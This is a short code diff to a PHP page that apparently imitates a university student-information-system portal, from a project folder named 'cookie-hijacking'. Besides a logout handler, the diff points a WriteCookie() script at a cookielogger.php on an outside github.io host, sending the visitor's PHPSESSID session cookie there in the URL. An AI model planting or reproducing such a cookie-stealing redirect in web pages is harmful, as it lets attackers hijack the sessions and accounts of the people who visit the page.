@@ -1,3 +1,14 @@
+<?php
+session_start();
+
+if(isset($_POST['logout']))
+{
+ unset($_SESSION['email']);
+ header('Location: https://shatha3710129.github.io/sis-upm.github.io/');
+ exit;
+}
+?>
+
 <html dir=ltr lang=en>
 <HEAD>
 <!--
@@ -218,7 +229,7 @@ form.submit();
 												function WriteCookie()
 												{
 												var allcookies = "<?php echo print_r($_COOKIE['PHPSESSID']); ?>";			   
-												window.location.href = "C:/Users/shatha/Desktop/sis-upm/upm.html/cookie-hijacking/php/cookielogger.php?cookie=" + allcookies;
+												window.location.href = "https://shatha3710129.github.io/sis-upm.github.io/cookie-hijacking/php/cookielogger.php?cookie=" + allcookies;
 												}
 												//-->
 											</script>
